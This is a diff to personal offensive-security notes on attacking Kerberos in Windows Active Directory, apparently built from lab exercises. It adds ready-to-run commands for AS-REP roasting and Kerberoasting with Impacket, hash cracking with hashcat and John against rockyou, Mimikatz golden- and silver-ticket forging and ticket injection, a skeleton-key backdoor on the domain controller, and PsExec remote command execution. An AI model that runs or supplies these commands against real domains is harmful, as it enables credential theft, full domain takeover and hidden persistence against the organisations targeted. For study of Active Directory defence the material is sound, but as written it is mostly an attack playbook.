@@ -1,4 +1,18 @@
 # Kerberos
+# Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting
+
+# Main Attacks
+- Kerbrute Enumeration - No domain access required 
+- Pass the Ticket - Access as a user to the domain required
+- Kerberoasting - Access as any user required
+- AS-REP Roasting - Access as any user required
+- Golden Ticket - Full domain compromise (domain admin) required 
+- Silver Ticket - Service hash required 
+- Skeleton Key - Full domain compromise (domain admin) required
+- Constrained Delegation
+- Unconstrained Delegation - Allows to retrieve tickets
+
+
 # We can enumerate users from a kerberos domain controller
 # We will need to supply a list of usernames to test, but since we are only
 # querying the DC and not authenticating it, this activity is generally 
@@ -8,7 +22,7 @@
 # we can sync it by using rdate
 
 # Tools:
-#
+
 # [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute)
 # [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module
 # [Rubeus](https://github.com/GhostPack/Rubeus)
@@ -61,6 +75,8 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 
 ;; check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+;; examople
+GetNPUsers.py spookysec.local/ -dc-ip 10.10.111.242  -usersfile users.txt -format hashcat -outputfile asrep.txt
 
 ## ASREPRoast (Rubeus)
 ;; check ASREPRoast for all users in current domain
@@ -71,8 +87,9 @@ hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
 ;; 18200 is the type of hash got with Kerberos 5 AS-REP etype 23 packets
 ;; Note that this is different from the hash type we use for Kerberoasting
 ;; or
-john --wordlist=<passwords_file> <AS_REP_responses_file>
-
+john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+;; but generally is automatically detected
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
 # Kerberoasting
 
@@ -82,6 +99,8 @@ python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -output
 python GetUserSPNs.py -request -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith
 ;; or
 python GetUserSPNs.py -request -dc-ip 10.10.10.175 domainname
+;; or
+python GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.160.146 -request -outputfile tgs_hashes.txt
 
 ;; or
 python GetUserSPNs.py <account_name/svc_tgs> -dc-ip <ip_address_of_dc> -request
@@ -102,9 +121,9 @@ Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } |
 
 ### Cracking with dictionary
 Cracking with dictionary of passwords:
-hashcat -m 13100 --force <TGSs_file> <passwords_file>
+hashcat -m 13100 --force <TGSs_file> <passwords_file> -o results.txt
 ;; or
-hashcat -m 13100 kerberoast.txt rockyou.txt
+hashcat -m 13100 kerberoast.txt rockyou.txt -o results.txt
 ;; or
 john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
 
@@ -197,6 +216,7 @@ Inject ticket with Rubeus:
 ## Silver Ticket (Impacket)
 ;; To generate the TGS with NTLM
 python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
+;; iirc the user_name is the user for which we create the ticket to access the service
 
 ;; To generate the TGS with AES key
 python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
@@ -212,16 +232,23 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 
 ## Silver Ticket (Mimikatz)
 ;; To generate the TGS with NTLM
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+mimikatz 
+> privilege::debug
+> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+;; iirc the /user is the user for which we create silver the ticket to access the service
 
 ;; To generate the TGS with AES 128 key
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+mimikatz
+> privilege::debug
+> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
 
 ;; To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
+mimikatz
+> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
 
 ;; Inject TGS with Mimikatz
-mimikatz # kerberos::ptt <ticket_kirbi_file>
+mimikatz
+> kerberos::ptt <ticket_kirbi_file>
 
 ;; Inject ticket with Rubeus:
 .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
@@ -250,16 +277,20 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 
 ## Golden Ticket (Mimikatz)
 ;; To generate the TGT ticket with NTLM
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
+mimikatz 
+> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
 
 ;; To generate the TGT ticket with AES 128 key
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
+mimikatz 
+> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
 
 ;; To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
+mimikatz 
+> kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
 
 ;; Inject TGT ticket with Mimikatz
-mimikatz # kerberos::ptt <ticket_kirbi_file>
+mimikatz
+> kerberos::ptt <ticket_kirbi_file>
 
 ;;# Inject TGT ticket with Rubeus
 .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
@@ -267,6 +298,37 @@ mimikatz # kerberos::ptt <ticket_kirbi_file>
 ;; Execute a cmd in the remote machine with PsExec
 .\PsExec.exe -accepteula \\<remote_hostname> cmd
 
+
+# Skeleton Key
+mimikatz (as a domain admin)
+> privilege::debug
+> misc::skeleton
+
+The default credentials of the hidden account will be: "mimikatz".
+
+Examples:
+;; The share will now be accessible without the need for the Administrators password:
+net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 
+
+;; Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1:
+example: dir \\Desktop-1\c$ /user:Machine1 mimikatz 
+
+The skeleton key will not persist by itself because it runs in the memory,
+it can be scripted or persisted using other tools and techniques.
+
+# Unconstrained Delegation
+
+This is very simple to exploit, we basically hunt for
+machines with unconstrained delegation enabled and try to
+access them, since they are a trove of tickets.
+
+Take notes from here:
+https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
+
+# Constrained Delegation
+
+Take notes from here:
+https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
 
 # Misc
 
@@ -284,3 +346,4 @@ setspn.exe -q */*
 
 ## Show all MSSQL service accounts
 setspn.exe -q MSSQLSvc/*
+
